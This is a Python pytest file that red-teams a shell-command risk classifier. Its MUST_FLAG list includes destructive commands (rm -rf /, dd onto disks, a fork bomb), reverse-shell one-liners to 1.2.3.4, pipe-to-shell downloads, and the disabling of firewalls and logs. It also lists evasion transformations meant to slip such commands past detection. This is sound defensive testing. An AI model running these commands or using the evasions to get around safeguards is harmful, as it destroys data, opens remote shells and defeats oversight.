"""Red-team tests for the risk engine.

Take commands that must always be flagged, apply common evasion transformations,
and require that the verdict never gets *lower*. Also keep a corpus of everyday
commands to measure false positives.
"""
import pytest

from shadowguide.risk import Level, classify

MUST_FLAG = [
    # CRITICAL
    ("rm -rf /", Level.CRITICAL), ("rm -rf /*", Level.CRITICAL), ("rm -rf ~", Level.CRITICAL),
    ("rm -rf $HOME", Level.CRITICAL), ("rm -rf $HOME/*", Level.CRITICAL), ("rm -rf /home", Level.CRITICAL),
    ("rm -rf /var/", Level.CRITICAL), ("rm -r -f /", Level.CRITICAL), ("rm --recursive --force /", Level.CRITICAL),
    ("rm -rf --no-preserve-root /", Level.CRITICAL), ("rm -rf -- /", Level.CRITICAL), ("rm -rf //", Level.CRITICAL),
    ("dd if=/dev/zero of=/dev/sda", Level.CRITICAL), ("mkfs.ext4 /dev/sda1", Level.CRITICAL),
    ("cat /dev/zero > /dev/sda", Level.CRITICAL), ("cp image.bin /dev/sda", Level.CRITICAL),
    ("chmod -R 000 /", Level.CRITICAL), ("format C:", Level.CRITICAL),
    ("vssadmin delete shadows /all /quiet", Level.CRITICAL), ("diskutil eraseDisk JHFS+ x /dev/disk2", Level.CRITICAL),
    (":(){ :|:& };:", Level.CRITICAL), ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", Level.CRITICAL),
    ("nc -e /bin/sh 1.2.3.4 4444", Level.CRITICAL), ("echo c > /proc/sysrq-trigger", Level.CRITICAL),
    ("Remove-Item C:\\ -Recurse -Force", Level.CRITICAL), ("rd /s /q C:\\", Level.CRITICAL),
    # HIGH
    ("rm -rf ./build", Level.HIGH), ("find . -delete", Level.HIGH), ("curl http://x.test/s.sh | sh", Level.HIGH),
    ("wget -qO- http://x.test/s | bash", Level.HIGH), ("iex (iwr http://x.test)", Level.HIGH),
    ("shutdown now", Level.HIGH), ("reboot", Level.HIGH), ("ufw disable", Level.HIGH), ("iptables -F", Level.HIGH),
    ("iptables -P INPUT DROP", Level.HIGH), ("setenforce 0", Level.HIGH), ("chmod 777 /etc/passwd", Level.HIGH),
    ("hydra -l a -P b ssh://x.test", Level.HIGH), ("sqlmap -u http://x.test", Level.HIGH), ("msfconsole", Level.HIGH),
    ("mimikatz", Level.HIGH), ("history -c", Level.HIGH), ("wevtutil cl Security", Level.HIGH),
    ("Set-ExecutionPolicy Unrestricted", Level.HIGH), ("bcdedit /set x y", Level.HIGH),
    ("reg delete HKLM\\Software\\x /f", Level.HIGH), ("Add-MpPreference -ExclusionPath C:\\", Level.HIGH),
    ("csrutil disable", Level.HIGH), ("nmap --script vuln 10.0.0.1", Level.HIGH), ("crontab -r", Level.HIGH),
    ("zpool destroy tank", Level.HIGH), ("icacls C:\\data /grant Everyone:F", Level.HIGH),
    # MEDIUM
    ("sudo ls", Level.MEDIUM), ("nmap -sV 10.0.0.1", Level.MEDIUM), ("pip install requests", Level.MEDIUM),
    ("kill -9 123", Level.MEDIUM), ("systemctl stop nginx", Level.MEDIUM), ("tcpdump -i eth0", Level.MEDIUM),
    ("git push --force", Level.MEDIUM), ("docker system prune -a", Level.MEDIUM), ("curl -k https://x.test", Level.MEDIUM),
    ("apt install nmap", Level.MEDIUM), ("chown -R a:b /srv/x", Level.MEDIUM), ("passwd bob", Level.MEDIUM),
]

MUTATIONS = {
    "identity": lambda c: c,
    "upper": str.upper,
    "tabs": lambda c: c.replace(" ", "\t"),
    "wide_spaces": lambda c: c.replace(" ", "   "),
    "quote_split": lambda c: c[0] + '""' + c[1:],
    "backslash_split": lambda c: c[0] + "\\" + c[1:],
    "backtick_split": lambda c: c[0] + "`" + c[1:],
    "sudo": lambda c: "sudo " + c,
    "env": lambda c: "env " + c,
    "nohup": lambda c: "nohup " + c,
    "command": lambda c: "command " + c,
    "bash_c": lambda c: "bash -c '" + c.replace("'", "") + "'",
    "sh_c": lambda c: 'sh -c "' + c.replace('"', "") + '"',
    "eval": lambda c: 'eval "' + c.replace('"', "") + '"',
    "and_chain": lambda c: c + " && echo done",
    "semicolon_prefix": lambda c: "echo start; " + c,
    "subshell": lambda c: "$(" + c + ")",
    "tee_pipe": lambda c: c + " | tee out.txt",
}


@pytest.mark.parametrize("name", sorted(MUTATIONS))
def test_evasion_never_lowers_the_verdict(name):
    mutate = MUTATIONS[name]
    misses = []
    for command, expected in MUST_FLAG:
        got = classify(mutate(command)).level
        if got < expected:
            misses.append("{} -> {!r}: {} < {}".format(name, mutate(command), got.name, expected.name))
    assert not misses, "\n".join(misses)


BENIGN = [
    "ls -la", "pwd", "cd /tmp", "cat notes.txt", "grep -r TODO .", "find . -name '*.py'", "ps aux", "df -h", "du -sh *",
    "top", "whoami", "uname -a", "ip addr", "ping -c 4 example.com", "traceroute example.com", "nslookup example.com",
    "dig example.com", "curl -I https://example.com", "curl https://example.com -o page.html", "wget https://example.com/f.zip",
    "git status", "git log --oneline", "git pull", "git clone https://github.com/x/y", "python script.py", "tar -xzf a.tar.gz",
    "chmod +x run.sh", "mkdir -p build", "cp a b", "mv a b", "echo hello", "history", "ssh user@host", "scp a user@host:/tmp",
    "ss -tulpn", "netstat -an", "journalctl -xe", "tail -f app.log", "head -n 5 file", "sort file | uniq -c",
    "Get-Process", "Get-ChildItem", "dir", "ipconfig /all", "tasklist", "systeminfo", "hostname", "ver",
    "man shutdown", "which reboot", "echo reboot", "echo halt", "journalctl --list-boots",
    "rm notes.txt", "del notes.txt", "touch file", "ln -s a b", "less /var/log/syslog", "man rm",
]


@pytest.mark.parametrize("command", BENIGN)
def test_everyday_commands_are_not_flagged(command):
    assert classify(command).level == Level.LOW, classify(command).findings
